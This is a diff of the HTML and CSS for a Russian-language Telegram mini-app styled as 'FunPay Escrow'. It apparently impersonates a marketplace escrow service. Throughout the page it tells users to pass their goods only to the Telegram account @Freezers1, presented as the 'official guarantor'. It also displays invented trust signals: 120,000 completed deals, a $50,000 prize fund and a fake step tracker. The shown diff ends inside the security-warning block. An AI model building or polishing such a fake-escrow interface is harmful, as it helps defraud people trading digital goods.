@@ -2,12 +2,13 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>FunPay Escrow</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+  <title>FunPay Escrow · Secure System</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
       --primary-blue: #2b82fb;
+      --primary-hover: #1d6edc;
       --bg-color: #f3f6fb;
       --card-bg: #ffffff;
       --text-color: #1a1a1a;
@@ -15,6 +16,8 @@
       --border-color: #e6ecf3;
       --input-bg: #f8fafc;
       --danger-red: #ff4d4f;
+      --success-green: #22c55e;
+      --warning-yellow: #f59e0b;
     }
 
     * {
@@ -23,26 +26,27 @@
       padding: 0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       -webkit-tap-highlight-color: transparent;
+      user-select: none;
     }
 
     body {
       background-color: var(--bg-color);
       color: var(--text-color);
       min-height: 100vh;
-      padding-bottom: 75px;
+      padding-bottom: 90px;
       position: relative;
       overflow-x: hidden;
     }
 
     body::before {
-      content: "FUNPAY  FUNPAY  FUNPAY  FUNPAY\A FUNPAY  FUNPAY  FUNPAY  FUNPAY\A FUNPAY  FUNPAY  FUNPAY  FUNPAY\A FUNPAY  FUNPAY  FUNPAY  FUNPAY";
+      content: "FUNPAY  ESCROW  SECURE  SYSTEM\A FUNPAY  ESCROW  SECURE  SYSTEM\A FUNPAY  ESCROW  SECURE  SYSTEM\A FUNPAY  ESCROW  SECURE  SYSTEM";
       white-space: pre;
       position: fixed;
       top: -50%; left: -50%;
       width: 200%; height: 200%;
-      font-size: 26px;
+      font-size: 24px;
       font-weight: 900;
-      color: rgba(43, 130, 251, 0.035);
+      color: rgba(43, 130, 251, 0.028);
       transform: rotate(-25deg);
       pointer-events: none;
       z-index: 0;
@@ -53,15 +57,24 @@
       position: relative;
       z-index: 1;
       padding: 16px;
+      max-width: 600px;
+      margin: 0 auto;
     }
 
     .tab-page { display: none; }
-    .tab-page.active { display: block; }
+    .tab-page.active { display: block; animation: fadeIn 0.25s cubic-bezier(0.1, 0.9, 0.2, 1); }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
     h1.page-title {
       font-size: 24px;
       font-weight: 800;
       margin-bottom: 16px;
+      letter-spacing: -0.3px;
+      color: var(--text-color);
     }
 
     .btn-primary {
@@ -79,6 +92,12 @@
       justify-content: center;
       gap: 8px;
       box-shadow: 0 6px 20px rgba(43, 130, 251, 0.25);
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.98);
+      background: var(--primary-hover);
     }
 
     .btn-secondary {
@@ -91,6 +110,11 @@
       font-weight: 700;
       color: var(--text-color);
       cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-secondary:active {
+      background: #edf2f7;
     }
 
     .btn-group {
@@ -111,9 +135,15 @@
       border-radius: 16px;
       border: 1px solid var(--border-color);
       cursor: pointer;
+      transition: transform 0.1s, border-color 0.2s;
     }
 
-    .stat-card h3 { font-size: 18px; font-weight: 800; }
+    .stat-card:active {
+      transform: scale(0.97);
+      border-color: var(--primary-blue);
+    }
+
+    .stat-card h3 { font-size: 20px; font-weight: 800; color: var(--text-color); }
     .stat-card p { font-size: 12px; color: var(--subtext-color); margin-top: 2px; }
 
     .join-card {
@@ -122,6 +152,7 @@
       border-radius: 20px;
       border: 1px solid var(--border-color);
       margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
     }
 
     .join-card label {
@@ -129,6 +160,7 @@
       color: var(--subtext-color);
       margin-bottom: 8px;
       display: block;
+      font-weight: 600;
     }
 
     .joined-deal-banner {
@@ -139,6 +171,7 @@
       border-radius: 16px;
       border: 1px solid #3b82f6;
       margin-bottom: 16px;
+      box-shadow: 0 4px 14px rgba(30, 41, 59, 0.15);
     }
 
     .code-input {
@@ -149,17 +182,26 @@
       border-radius: 12px;
       font-size: 16px;
       text-align: center;
-      font-weight: 600;
+      font-weight: 700;
       margin-bottom: 12px;
       outline: none;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-color);
+    }
+
+    .code-input:focus {
+      border-color: var(--primary-blue);
     }
 
     .info-banner {
       font-size: 12px;
       color: var(--subtext-color);
       line-height: 1.5;
+      text-align: center;
+      padding: 0 10px;
     }
-    .info-banner a { color: var(--primary-blue); text-decoration: none; font-weight: 600; }
+    .info-banner a { color: var(--primary-blue); text-decoration: none; font-weight: 700; }
 
     .bottom-bar {
       position: fixed;
@@ -167,9 +209,10 @@
       background: var(--card-bg);
       display: flex;
       justify-content: space-around;
-      padding: 8px 0 12px;
+      padding: 10px 0 14px;
       border-top: 1px solid var(--border-color);
       z-index: 100;
+      box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.03);
     }
 
     .nav-tab {
@@ -181,9 +224,10 @@
       font-size: 11px;
       cursor: pointer;
       width: 25%;
+      transition: color 0.2s;
     }
 
-    .nav-tab.active { color: var(--primary-blue); font-weight: 600; }
+    .nav-tab.active { color: var(--primary-blue); font-weight: 700; }
     .nav-tab svg { width: 22px; height: 22px; fill: currentColor; }
 
     .currency-scroll {
@@ -192,23 +236,27 @@
       overflow-x: auto;
       padding-bottom: 8px;
       margin-bottom: 16px;
+      scrollbar-width: none;
     }
+    .currency-scroll::-webkit-scrollbar { display: none; }
 
     .chip {
-      padding: 8px 14px;
+      padding: 8px 16px;
       background: var(--card-bg);
       border-radius: 20px;
       border: 1px solid var(--border-color);
       font-size: 13px;
-      font-weight: 600;
+      font-weight: 700;
       white-space: nowrap;
       cursor: pointer;
+      transition: all 0.2s;
     }
 
     .chip.active {
       background: var(--primary-blue);
       color: #fff;
       border-color: var(--primary-blue);
+      box-shadow: 0 4px 10px rgba(43, 130, 251, 0.3);
     }
 
     .wallet-card {
@@ -217,15 +265,17 @@
       padding: 20px;
       border: 1px solid var(--border-color);
       margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
     }
 
     .modal-overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.5);
+      background: rgba(0,0,0,0.55);
       z-index: 999;
       display: none;
       align-items: flex-end;
+      backdrop-filter: blur(3px);
     }
     .modal-overlay.active { display: flex !important; }
 
@@ -235,13 +285,19 @@
       border-radius: 28px 28px 0 0;
       padding: 24px 20px;
       position: relative;
-      max-height: 90vh;
+      max-height: 88vh;
       overflow-y: auto;
+      animation: slideUp 0.25s cubic-bezier(0.1, 0.9, 0.2, 1);
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(100%); }
+      to { transform: translateY(0); }
     }
 
     .modal-close {
       position: absolute;
-      top: 16px; right: 16px;
+      top: 18px; right: 18px;
       background: #f1f5f9;
       width: 32px; height: 32px;
       border-radius: 50%;
@@ -250,6 +306,7 @@
       color: #64748b;
       font-size: 16px;
       z-index: 5;
+      font-weight: 700;
     }
 
     .modal-title { font-size: 18px; font-weight: 800; margin-bottom: 4px; }
@@ -263,27 +320,34 @@
 
     .currency-item {
       display: flex; align-items: center; gap: 10px;
-      padding: 12px; background: var(--input-bg);
+      padding: 14px; background: var(--input-bg);
       border-radius: 14px; cursor: pointer; font-weight: 700;
+      border: 1px solid transparent;
+      transition: all 0.2s;
+    }
+
+    .currency-item:active {
+      border-color: var(--primary-blue);
+      background: #ffffff;
     }
 
     .amount-input-wrap {
       display: flex; align-items: center;
       background: var(--input-bg);
-      border-radius: 14px; padding: 4px 12px;
+      border-radius: 14px; padding: 4px 14px;
       border: 1px solid var(--border-color);
       margin-bottom: 16px;
     }
 
     .amount-input-wrap input {
       border: none; background: transparent;
-      padding: 12px 0; font-size: 18px; font-weight: 700;
-      width: 100%; outline: none;
+      padding: 12px 0; font-size: 20px; font-weight: 800;
+      width: 100%; outline: none; color: var(--text-color);
     }
 
     textarea.desc-input {
       width: 100%;
-      height: 120px;
+      height: 110px;
       background: var(--input-bg);
       border: 1px solid var(--border-color);
       border-radius: 14px;
@@ -292,374 +356,98 @@
       outline: none;
       resize: none;
       margin-bottom: 16px;
+      color: var(--text-color);
     }
 
-    .sec-header-wrap {
-      display: flex !important;
-      align-items: center !important;
-      gap: 14px !important;
-      margin-bottom: 16px !important;
-    }
-
+    /* БЛОК БЕЗОПАСНОСТИ */
+    .sec-header-wrap { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
     .sec-header-icon {
-      width: 50px !important;
-      height: 50px !important;
-      background: #ff4d4d !important;
-      border-radius: 50% !important;
-      display: flex !important;
-      align-items: center !important;
-      justify-content: center !important;
-      color: #ffffff !important;
-      font-size: 26px !important;
-      font-weight: 900 !important;
-      box-shadow: 0 4px 12px rgba(255, 77, 77, 0.3) !important;
-      flex-shrink: 0 !important;
+      width: 48px; height: 48px; background: #ff4d4d; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-size: 24px; font-weight: 900;
+      box-shadow: 0 4px 12px rgba(255, 77, 77, 0.3); flex-shrink: 0;
     }
-
-    .sec-header-title {
-      font-size: 20px !important;
-      font-weight: 800 !important;
-      color: #0f172a !important;
-      line-height: 1.2 !important;
-    }
-
-    .sec-section-title {
-      font-size: 13px !important;
-      font-weight: 800 !important;
-      color: #b91c1c !important;
-      margin-bottom: 12px !important;
-      text-transform: uppercase !important;
-    }
-
-    .sec-alert-box {
-      background: #fff5f5 !important;
-      border: 1px solid #fecaca !important;
-      border-radius: 16px !important;
-      padding: 14px !important;
-      margin-bottom: 14px !important;
-    }
-
-    .sec-alert-box-title {
-      color: #dc2626 !important;
-      font-weight: 800 !important;
-      font-size: 14px !important;
-      margin-bottom: 6px !important;
-      display: flex !important;
-      align-items: center !important;
-      gap: 6px !important;
-    }
-
-    .sec-alert-box-desc {
-      font-size: 12px !important;
-      color: #475569 !important;
-      line-height: 1.45 !important;
-    }
-
-    .sec-block-label {
-      font-size: 13px !important;
-      font-weight: 800 !important;
-      color: #0f172a !important;
-      margin: 16px 0 10px !important;
-      display: flex !important;
-      align-items: center !important;
-      gap: 6px !important;
-    }
-
-    .sec-card-green {
-      background: #f0fdf4 !important;
-      border: 1px solid #bbf7d0 !important;
-      border-radius: 16px !important;
-      padding: 14px !important;
-      margin-bottom: 10px !important;
-    }
-
-    .sec-card-green-text {
-      font-size: 13px !important;
-      color: #166534 !important;
-      font-weight: 600 !important;
-      margin-bottom: 8px !important;
-      display: flex !important;
-      align-items: center !important;
-      gap: 8px !important;
-    }
-
+    .sec-header-title { font-size: 20px; font-weight: 800; color: #0f172a; line-height: 1.2; }
+    .sec-section-title { font-size: 12px; font-weight: 800; color: #b91c1c; margin-bottom: 12px; text-transform: uppercase; }
+    .sec-alert-box { background: #fff5f5; border: 1px solid #fecaca; border-radius: 16px; padding: 14px; margin-bottom: 14px; }
+    .sec-alert-box-title { color: #dc2626; font-weight: 800; font-size: 14px; margin-bottom: 4px; display: flex; align-items: center; gap: 6px; }
+    .sec-alert-box-desc { font-size: 12px; color: #475569; line-height: 1.45; }
+    .sec-block-label { font-size: 13px; font-weight: 800; color: #0f172a; margin: 16px 0 10px; display: flex; align-items: center; gap: 6px; }
+    .sec-card-green { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 16px; padding: 14px; margin-bottom: 10px; }
+    .sec-card-green-text { font-size: 13px; color: #166534; font-weight: 600; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
     .sec-guarantor-pill {
-      background: #e0f2fe !important;
-      color: #0284c7 !important;
-      font-weight: 800 !important;
-      font-size: 14px !important;
-      padding: 10px 16px !important;
-      border-radius: 12px !important;
-      display: block !important;
-      text-decoration: none !important;
-      width: 100% !important;
-      text-align: center !important;
-      box-sizing: border-box !important;
+      background: #e0f2fe; color: #0284c7; font-weight: 800; font-size: 14px;
+      padding: 10px 16px; border-radius: 12px; display: block; text-decoration: none;
+      width: 100%; text-align: center; box-sizing: border-box;
     }
-
-    .sec-card-red {
-      background: #fff5f5 !important;
-      border: 1px solid #fecaca !important;
-      border-radius: 16px !important;
-      padding: 12px 14px !important;
-      margin-bottom: 10px !important;
-      display: flex !important;
-      align-items: center !important;
-      gap: 10px !important;
-    }
-
-    .sec-card-red-icon {
-      width: 26px !important;
-      height: 26px !important;
-      background: #ef4444 !important;
-      color: #fff !important;
-      border-radius: 50% !important;
-      display: flex !important;
-      align-items: center !important;
-      justify-content: center !important;
-      font-weight: 800 !important;
-      font-size: 14px !important;
-      flex-shrink: 0 !important;
-    }
-
-    .sec-card-red-text {
-      font-size: 12px !important;
-      font-weight: 800 !important;
-      color: #991b1b !important;
-      line-height: 1.3 !important;
-    }
-
-    .sec-card-yellow {
-      background: #fffbeb !important;
-      border: 1px solid #fde68a !important;
-      border-radius: 16px !important;
-      padding: 12px 14px !important;
-      margin-bottom: 14px !important;
-      display: flex !important;
-      align-items: center !important;
-      gap: 10px !important;
-    }
-
-    .sec-card-yellow-icon {
-      width: 26px !important;
-      height: 26px !important;
-      background: #f59e0b !important;
-      color: #fff !important;
-      border-radius: 50% !important;
-      display: flex !important;
-      align-items: center !important;
-      justify-content: center !important;
-      font-weight: 800 !important;
-      font-size: 14px !important;
-      flex-shrink: 0 !important;
-    }
-
-    .sec-card-yellow-text {
-      font-size: 12px !important;
-      font-weight: 800 !important;
-      color: #b45309 !important;
-      line-height: 1.3 !important;
-    }
-
-    .sec-pill-danger {
-      background: #fff5f5 !important;
-      border: 1px solid #fecaca !important;
-      border-radius: 14px !important;
-      padding: 10px 14px !important;
-      color: #991b1b !important;
-      font-weight: 800 !important;
-      font-size: 13px !important;
-      text-align: center !important;
-      margin-bottom: 8px !important;
-    }
-
-    .sec-lock-card {
-      background: #f8fafc !important;
-      border: 1px solid #e2e8f0 !important;
-      border-radius: 16px !important;
-      padding: 12px 14px !important;
-      margin: 14px 0 16px !important;
-      display: flex !important;
-      align-items: center !important;
-      gap: 10px !important;
-      font-size: 12px !important;
-      color: #334155 !important;
-    }
-
+    .sec-card-red { background: #fff5f5; border: 1px solid #fecaca; border-radius: 16px; padding: 12px 14px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
+    .sec-card-red-icon { width: 24px; height: 24px; background: #ef4444; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
+    .sec-card-red-text { font-size: 12px; font-weight: 800; color: #991b1b; line-height: 1.3; }
+    .sec-card-yellow { background: #fffbeb; border: 1px solid #fde68a; border-radius: 16px; padding: 12px 14px; margin-bottom: 14px; display: flex; align-items: center; gap: 10px; }
+    .sec-card-yellow-icon { width: 24px; height: 24px; background: #f59e0b; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
+    .sec-card-yellow-text { font-size: 12px; font-weight: 800; color: #b45309; line-height: 1.3; }
+    .sec-pill-danger { background: #fff5f5; border: 1px solid #fecaca; border-radius: 14px; padding: 10px 14px; color: #991b1b; font-weight: 800; font-size: 13px; text-align: center; margin-bottom: 8px; }
+    .sec-lock-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 12px 14px; margin: 14px 0 16px; display: flex; align-items: center; gap: 10px; font-size: 12px; color: #334155; }
     .btn-safety-confirm {
-      background: #ff4d4d !important;
-      color: #ffffff !important;
-      width: 100% !important;
-      padding: 16px !important;
-      border-radius: 16px !important;
-      border: none !important;
-      font-size: 15px !important;
-      font-weight: 800 !important;
-      cursor: pointer !important;
-      box-shadow: 0 6px 18px rgba(255, 77, 77, 0.3) !important;
+      background: #ff4d4d; color: #ffffff; width: 100%; padding: 16px;
+      border-radius: 16px; border: none; font-size: 15px; font-weight: 800;
+      cursor: pointer; box-shadow: 0 6px 18px rgba(255, 77, 77, 0.3); transition: opacity 0.2s;
     }
 
     .deal-status-card {
-      background: var(--card-bg);
-      border-radius: 24px;
-      padding: 24px 16px;
-      border: 1px solid var(--border-color);
-      text-align: center;
-      margin-bottom: 20px;
+      background: var(--card-bg); border-radius: 24px; padding: 24px 16px;
+      border: 1px solid var(--border-color); text-align: center; margin-bottom: 20px;
     }
-
     .circle-icon-wrap {
-      width: 70px;
-      height: 70px;
-      background: #0d2757;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 12px;
-      font-size: 36px;
-      box-shadow: 0 4px 14px rgba(0,0,0,0.1);
+      width: 64px; height: 64px; background: #0d2757; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 12px; font-size: 32px; box-shadow: 0 4px 14px rgba(0,0,0,0.1);
     }
-
-    .deal-amount {
-      font-size: 32px;
-      font-weight: 900;
-      margin-bottom: 4px;
-      color: var(--text-color);
-      letter-spacing: -0.5px;
-    }
-
-    .deal-desc {
-      font-size: 13px;
-      color: var(--subtext-color);
-      margin-bottom: 20px;
-    }
-
-    .deal-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px 0;
-      border-bottom: 1px solid #f0f4f8;
-      font-size: 14px;
-    }
-
-    .deal-row-label {
-      color: var(--subtext-color);
-      font-weight: 500;
-    }
-
-    .deal-row-val {
-      font-weight: 700;
-      color: var(--text-color);
-      text-align: right;
-    }
-
-    .steps-container {
-      margin-top: 24px;
-      text-align: center;
-    }
-
-    .steps-sub {
-      font-size: 12px;
-      color: var(--subtext-color);
-      margin-bottom: 14px;
-    }
-
-    .steps-dots {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      position: relative;
-      margin: 0 10px 8px;
-    }
-
-    .steps-dots::before {
-      content: "";
-      position: absolute;
-      top: 50%; left: 0; right: 0;
-      height: 2px;
-      background: #e2e8f0;
-      z-index: 0;
-      transform: translateY(-50%);
-    }
-
-    .dot-item {
-      width: 14px;
-      height: 14px;
-      border-radius: 50%;
-      background: #cbd5e1;
-      z-index: 1;
-    }
-
-    .dot-item.active {
-      background: #22c55e;
-      box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.2);
-    }
-
-    .steps-labels {
-      display: flex;
-      justify-content: space-between;
-      font-size: 10px;
-      color: var(--subtext-color);
-      font-weight: 600;
-    }
-
-    .steps-labels span {
-      width: 20%;
-      text-align: center;
-    }
-
-    .steps-labels span.active {
-      color: #22c55e;
-    }
+    .deal-amount { font-size: 30px; font-weight: 900; margin-bottom: 4px; color: var(--text-color); letter-spacing: -0.5px; }
+    .deal-desc { font-size: 13px; color: var(--subtext-color); margin-bottom: 20px; }
+    .deal-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f0f4f8; font-size: 14px; }
+    .deal-row-label { color: var(--subtext-color); font-weight: 500; }
+    .deal-row-val { font-weight: 700; color: var(--text-color); text-align: right; }
+    
+    .steps-container { margin-top: 24px; text-align: center; }
+    .steps-sub { font-size: 12px; color: var(--subtext-color); margin-bottom: 14px; }
+    .steps-dots { display: flex; justify-content: space-between; align-items: center; position: relative; margin: 0 10px 8px; }
+    .steps-dots::before { content: ""; position: absolute; top: 50%; left: 0; right: 0; height: 2px; background: #e2e8f0; z-index: 0; transform: translateY(-50%); }
+    .dot-item { width: 14px; height: 14px; border-radius: 50%; background: #cbd5e1; z-index: 1; }
+    .dot-item.active { background: var(--success-green); box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.2); }
+    .steps-labels { display: flex; justify-content: space-between; font-size: 10px; color: var(--subtext-color); font-weight: 600; }
+    .steps-labels span { width: 20%; text-align: center; }
+    .steps-labels span.active { color: var(--success-green); }
 
     .deal-list-item {
-      background: var(--card-bg);
-      border-radius: 16px;
-      padding: 14px;
-      border: 1px solid var(--border-color);
-      margin-bottom: 10px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      cursor: pointer;
+      background: var(--card-bg); border-radius: 16px; padding: 14px;
+      border: 1px solid var(--border-color); margin-bottom: 10px;
+      display: flex; justify-content: space-between; align-items: center; cursor: pointer;
     }
 
     .profile-balance-card {
       background: linear-gradient(135deg, var(--primary-blue), #1e62d0);
-      color: #fff;
-      border-radius: 20px;
-      padding: 20px;
-      margin-bottom: 16px;
-      text-align: left;
+      color: #fff; border-radius: 20px; padding: 20px; margin-bottom: 16px; text-align: left;
     }
-    .profile-bal-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 14px;
-      font-weight: 700;
-      padding: 4px 0;
-    }
+    .profile-bal-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 700; padding: 4px 0; }
   </style>
 </head>
 <body>
 
   <div class="container">
 
-    <!-- СДЕЛКИ -->
+    <!-- ВКЛАДКА: СДЕЛКИ -->
     <div id="page-deals" class="tab-page active">
       <h1 class="page-title">Мои сделки</h1>
 
       <div id="joined-deal-banner" class="joined-deal-banner">
-        <div style="font-weight: 700; color: #60a5fa; margin-bottom: 4px;">🤝 Присоединились к сделке</div>
+        <div style="font-weight: 700; color: #60a5fa; margin-bottom: 4px;">🤝 Активная сделка по ссылке</div>
         <div style="font-size: 13px; color: #cbd5e1;">Код сделки: <span id="joined-deal-code" style="font-weight: 800; color: #38bdf8;">-</span></div>
-        <button class="btn-primary" style="margin-top: 10px; padding: 10px;" onclick="viewJoinedDeal()">Открыть информацию о сделке</button>
+        <button class="btn-primary" style="margin-top: 10px; padding: 10px;" onclick="viewJoinedDeal()">Открыть сделку</button>
       </div>
 
       <button class="btn-primary" onclick="openModal('modal-type')">
-        <span>+</span> Создать сделку
+        <span style="font-size: 18px;">+</span> Создать сделку
       </button>
 
       <div class="deals-grid">
@@ -667,7 +455,7 @@
           <h3 id="active-deals-count-title">0</h3>
           <p>Активные сделки</p>
         </div>
-        <div class="stat-card" onclick="alert('История пуста')">
+        <div class="stat-card" onclick="tg.showAlert('У вас нет завершённых сделок')">
           <h3>0</h3>
           <p>Завершённые</p>
         </div>
@@ -685,11 +473,11 @@
       </div>
 
       <div class="info-banner">
-        Передавайте товар только на <a href="https://t.me/Freezers1" target="_blank">@Freezers1</a>. Нажмите на юзернейм, чтобы открыть гаранта.
+        Передавайте товар только официальному гаранту <a href="https://t.me/Freezers1" target="_blank">@Freezers1</a>.
       </div>
     </div>
 
-    <!-- КОШЕЛЬКИ -->
+    <!-- ВКЛАДКА: КОШЕЛЬКИ -->
     <div id="page-wallets" class="tab-page">
       <h1 class="page-title">Мои кошельки</h1>
 
@@ -706,7 +494,7 @@
           <div id="w-icon" style="font-size: 32px;">₽</div>
           <div>
             <h4 id="w-name" style="font-size: 16px; font-weight: 700;">Рубли</h4>
-            <p id="w-bal" style="font-size: 14px; font-weight: 800; color: var(--primary-blue);">0.00 ₽</p>
+            <p id="w-bal" style="font-size: 16px; font-weight: 800; color: var(--primary-blue);">0.00 ₽</p>
           </div>
         </div>
 
@@ -717,26 +505,26 @@
       </div>
     </div>
 
-    <!-- ЛИДЕРЫ -->
+    <!-- ВКЛАДКА: ЛИДЕРЫ -->
     <div id="page-leaders" class="tab-page">
       <div style="text-align: center; margin-bottom: 20px;">
         <h1 style="font-size: 22px; font-weight: 900;">Топ участников</h1>
-        <p style="font-size: 12px; color: var(--subtext-color); margin-top: 4px;">Уже приняли участие более 120 тысяч человек</p>
+        <p style="font-size: 12px; color: var(--subtext-color); margin-top: 4px;">Успешно проведено более 120 000 сделок</p>
       </div>
 
       <div class="wallet-card" style="text-align: center;">
-        <div style="font-size: 11px; color: var(--subtext-color); margin-bottom: 8px;">ДО СТАРТА</div>
+        <div style="font-size: 11px; color: var(--subtext-color); margin-bottom: 8px;">ДО СТАРТА СЕЗОНА</div>
         <div style="display: flex; justify-content: center; gap: 8px; font-weight: 800; font-size: 18px; margin-bottom: 12px;">
           <div>00<br><span style="font-size:9px; color:gray;">дней</span></div>:
           <div>18<br><span style="font-size:9px; color:gray;">часов</span></div>:
           <div>49<br><span style="font-size:9px; color:gray;">минут</span></div>
         </div>
-        <div style="font-size: 12px; color: var(--subtext-color);">призовой фонд</div>
+        <div style="font-size: 12px; color: var(--subtext-color);">общий призовой фонд</div>
         <div style="font-size: 28px; font-weight: 900; color: var(--primary-blue);">$50 000</div>
       </div>
     </div>
 
-    <!-- ПРОФИЛЬ -->
+    <!-- ВКЛАДКА: ПРОФИЛЬ -->
     <div id="page-profile" class="tab-page">
       <div style="text-align: center; margin-bottom: 20px;">
         <div id="prof-avatar" style="width: 60px; height: 60px; background: #ff5252; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: 800; margin: 0 auto 10px;">F</div>
@@ -773,7 +561,7 @@
       </div>
 
       <div class="wallet-card">
-        <div style="font-size: 12px; color: var(--subtext-color);">Аккаунт гаранта:</div>
+        <div style="font-size: 12px; color: var(--subtext-color);">Официальный гарант:</div>
         <div style="font-size: 15px; font-weight: 700; color: var(--primary-blue); margin-bottom: 12px;">@Freezers1</div>
         <button class="btn-primary" onclick="redirectToChat()">Открыть @Freezers1</button>
       </div>
@@ -786,31 +574,31 @@
       <div class="deal-status-card">
         <div class="circle-icon-wrap" id="dv-icon">⭐</div>
         <div class="deal-amount" id="dv-amount">2 500 STARS</div>
-        <div class="deal-desc" id="dv-desc">t.me/nft/IceCream-315224</div>
+        <div class="deal-desc" id="dv-desc">Безопасная сделка FunPay</div>
 
         <div class="deal-row">
           <span class="deal-row-label">Статус</span>
-          <span class="deal-row-val" id="dv-status">Ожидание второй стороны</span>
+          <span class="deal-row-val" id="dv-status" style="color: var(--warning-yellow);">Ожидание второй стороны</span>
         </div>
         <div class="deal-row">
           <span class="deal-row-label">Продавец</span>
-          <span class="deal-row-val" id="dv-seller" style="font-weight: 600;">Продавец не присоединился</span>
+          <span class="deal-row-val" id="dv-seller" style="font-weight: 600;">Ожидание подключения...</span>
         </div>
         <div class="deal-row">
           <span class="deal-row-label">Покупатель</span>
-          <span class="deal-row-val" id="dv-buyer" style="color: #f59e0b;">@Angelinvics (Вы)</span>
+          <span class="deal-row-val" id="dv-buyer" style="color: var(--primary-blue);">Вы</span>
         </div>
         <div class="deal-row">
           <span class="deal-row-label">Создана</span>
-          <span class="deal-row-val" id="dv-date">11.09.2026, 13:54:34</span>
+          <span class="deal-row-val" id="dv-date">-</span>
         </div>
         <div class="deal-row" style="border-bottom: none;">
           <span class="deal-row-label">Код</span>
-          <span class="deal-row-val" id="dv-code" style="font-size: 16px;">CA1715</span>
+          <span class="deal-row-val" id="dv-code" style="font-size: 16px;">-</span>
         </div>
 
         <div class="steps-container">
-          <div class="steps-sub">Шаг 1 из 5 · Безопасно через Telegram</div>
+          <div class="steps-sub">Шаг 1 из 5 · Гарантия сделки</div>
           <div class="steps-dots">
             <div class="dot-item active"></div>
             <div class="dot-item"></div>
@@ -820,15 +608,15 @@
           </div>
           <div class="steps-labels">
             <span class="active">Создана</span>
-            <span>Покупатель</span>
-            <span>Оплачена</span>
-            <span>У гаранта</span>
-            <span>Получена</span>
+            <span>Участник</span>
+            <span>Оплата</span>
+            <span>Гарант</span>
+            <span>Итог</span>
           </div>
         </div>
       </div>
 
-      <button class="btn-primary" onclick="copyDealLink()">Скопировать ссылку для второй стороны</button>
+      <button class="btn-primary" onclick="copyDealLink()">Скопировать ссылку для партнера</button>
     </div>
 
   </div>
@@ -838,12 +626,12 @@
     <div class="modal-content">
       <div class="modal-close" onclick="closeModal('modal-type')">✕</div>
       <div class="modal-title">Создать сделку</div>
-      <div class="modal-subtitle">Выберите тип сделки</div>
+      <div class="modal-subtitle">Выберите роль в сделке</div>
       <div class="currency-item" style="margin-bottom: 10px;" onclick="selectType('Купить')">
-        <span style="color: var(--primary-blue);">↓</span> Купить
+        <span style="color: var(--primary-blue);">↓</span> Купить товар / услугу
       </div>
       <div class="currency-item" onclick="selectType('Продать')">
-        <span style="color: var(--primary-blue);">↑</span> Продать
+        <span style="color: var(--primary-blue);">↑</span> Продать товар / услугу
       </div>
     </div>
   </div>
@@ -852,7 +640,7 @@
     <div class="modal-content">
       <div class="modal-close" onclick="closeModal('modal-currency')">✕</div>
       <div class="modal-title">Выберите валюту</div>
-      <div class="modal-subtitle">Поддерживаемые сети</div>
+      <div class="modal-subtitle">Поддерживаемые сети и активы</div>
       <div class="currency-grid">
         <div class="currency-item" onclick="selectCurr('RUB')">₽ RUB</div>
         <div class="currency-item" onclick="selectCurr('STARS')">⭐ STARS</div>
@@ -867,8 +655,8 @@
   <div id="modal-amount" class="modal-overlay">
     <div class="modal-content">
       <div class="modal-close" onclick="closeModal('modal-amount')">✕</div>
-      <div class="modal-title">Создать сделку</div>
-      <div class="modal-subtitle">Введите сумму</div>
+      <div class="modal-title">Сумма сделки</div>
+      <div class="modal-subtitle">Укажите точную сумму</div>
       <div class="amount-input-wrap">
         <input type="number" id="deal-amount-input" placeholder="0.00" step="any">
         <span id="selected-curr-badge" style="font-weight: 800;">RUB</span>
@@ -880,9 +668,9 @@
   <div id="modal-desc" class="modal-overlay">
     <div class="modal-content">
       <div class="modal-close" onclick="closeModal('modal-desc')">✕</div>
-      <div class="modal-title">Создать сделку</div>
-      <div class="modal-subtitle">Описание товара</div>
-      <textarea id="deal-desc-input" class="desc-input" placeholder="Опишите товар..."></textarea>
+      <div class="modal-title">Описание</div>
+      <div class="modal-subtitle">Опишите детали сделки</div>
+      <textarea id="deal-desc-input" class="desc-input" placeholder="Например: аккаунт PUBG Mobile, промокод..."></textarea>
       <button class="btn-primary" onclick="goToSafety()">Далее</button>
     </div>
   </div>
@@ -896,58 +684,26 @@
         <div class="sec-header-title">Безопасность<br>сделки</div>
       </div>
 
